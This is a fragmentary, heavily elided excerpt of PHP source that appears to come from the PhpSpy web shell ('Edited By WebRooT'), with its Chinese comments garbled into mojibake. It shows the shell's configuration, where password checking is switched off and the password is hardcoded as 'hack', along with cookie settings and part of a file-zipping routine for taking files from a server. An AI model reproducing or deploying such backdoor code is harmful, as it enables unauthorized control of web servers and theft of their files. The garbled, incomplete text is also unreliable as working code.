...
/*===================== ³Ì� òÅäÖÃ =====================*/
$admin = array();
// ÊÇ·ñ� èÒªÃÜÂëÑéÖ¤, true �?ª� èÒªÑéÖ¤, false �?ªÖ±½Ó½øÈë.� ÂÃæÑ¡� îÔò�?�?� §
$admin['check'] = false;
// Èç¹û� èÒªÃÜÂëÑéÖ¤,Çë� �?¸ÄµÇÂ½ÃÜÂë
$admin['pass']  = 'hack';

//ÈçÄú¶Ô cookie ×÷ÓÃ·¶�?§Ó� ÌØÊâÒªÇó, »òµÇÂ¼²»Õý³£, Çë� �?¸Ä� ÂÃæ±ä� ¿, ·ñÔòÇë±£³ÖÄ¬È� 
// cookie Ç°×º
$admin['cookiepre'] = '';
// cookie ×÷ÓÃÓò
$admin['cookiedomain'] = '';
	...
	if (!$dbname) {
		...
		if (!file_exists($mysqldlfile)) {
			...
			if(!$result){
				...
				//ÓÃÊ±¼ä´� À´±þ½Ø¶� ,±ÜÃâ³ö� Ö¶� È¡×ÔÉûò°üº¬__magiccoder_1111111111_eof__µÄ�?Ä¼þÊ±²»� êÕûµÄÇé¿ö
...
<title><?php echo str_replace('.','','P.h.p.S.p.y');?> | Edited By WebRooT</title>
<style type="text/css">
	...
	function PHPZip($dir)	{
		if (@function_exists('gzcompress'))	{
			...
			if (is_array($dir)) $filelist = $dir;
				...
				$filelist=$this -> GetFileList($dir);//�?Ä¼þ� � ±�
